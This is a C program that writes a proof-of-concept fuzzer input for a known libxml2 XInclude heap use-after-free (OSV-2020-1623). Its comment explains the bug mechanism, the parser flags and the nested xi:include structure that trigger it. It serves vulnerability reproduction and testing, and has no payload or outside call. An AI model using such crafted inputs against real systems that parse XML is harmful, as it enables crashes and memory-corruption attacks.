/*
 * gen_poc.c: Generate a binary PoC for OSV-2020-1623
 *
 * The libxml2 xml fuzzer expects input in a specific format:
 *   - 4 bytes: parser options (int, little-endian)
 *   - Then: entity strings as URL\\\n content\\\n pairs
 *
 * XML_PARSE_XINCLUDE = 1024 (0x400) must be set for XInclude processing.
 * XML_PARSE_NOXINCNODE = 32768 (0x8000) triggers xmlFreeNode on xi:include.
 *
 * Bug mechanism:
 *   xmlXIncludeLoadFallback() iterates fallback->children one by one,
 *   calling xmlXIncludeDoProcess(newctxt, doc, child) for each. Each call
 *   goes through all 3 phases. The newctxt accumulates registered
 *   xi:includes across calls (incTab). On the 2nd child's Phase 3,
 *   the loop starts from incBase=0, and the guard condition passes
 *   for index 0 because emptyFb=1 (set by the 1st child's empty
 *   fallback and never cleared). xmlXIncludeIncludeNode(newctxt, 0)
 *   accesses incTab[0]->ref which was freed by the 1st call's Phase 3.
 *   Reading cur->type from freed memory = heap-use-after-free READ 4.
 *
 * Required input structure:
 *   - Outer xi:include with nonexistent href (triggers fallback)
 *   - Fallback contains two sibling xi:include elements as DIRECT children
 *   - First inner xi:include has EMPTY fallback (<xi:fallback/>)
 *   - Second inner xi:include has any fallback (or empty)
 *   - No whitespace/text nodes between the inner xi:includes (they must
 *     be direct sibling children so the for-loop processes them sequentially)
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

/* Write a string in the fuzz format: content followed by \\\n */
static void write_fuzz_string(FILE *f, const char *str) {
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++) {
        fputc(str[i], f);
        if (str[i] == '\\')
            fputc('\\', f);  /* escape backslashes */
    }
    fputc('\\', f);
    fputc('\n', f);
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    FILE *f;

    if (argc > 1)
        outfile = argv[1];

    f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Write parser options: XML_PARSE_XINCLUDE | XML_PARSE_NOXINCNODE */
    int32_t opts = 1024 | 32768;  /* 0x8400 = XINCLUDE + NOXINCNODE */
    fwrite(&opts, sizeof(opts), 1, f);

    /*
     * The XML document:
     * - Outer xi:include href="no1" fails to load -> processes fallback
     * - Fallback has two xi:include children (no whitespace between them!)
     * - First child: xi:include href="no2" with EMPTY fallback
     *   -> emptyFb=1, node freed by xmlXIncludeIncludeNode (NOXINCNODE)
     * - Second child: xi:include href="no3" with empty fallback
     *   -> Phase 3 re-processes index 0, accessing freed node -> UAF
     */
    const char *url = "main.xml";
    const char *xml =
        "<?xml version=\"1.0\"?>"
        "<doc xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
        "<xi:include href=\"no1\">"
        "<xi:fallback>"
        "<xi:include href=\"no2\"><xi:fallback/></xi:include>"
        "<xi:include href=\"no3\"><xi:fallback/></xi:include>"
        "</xi:fallback>"
        "</xi:include>"
        "</doc>";

    write_fuzz_string(f, url);
    write_fuzz_string(f, xml);

    fclose(f);
    fprintf(stderr, "Generated %s\n", outfile);
    return 0;
}
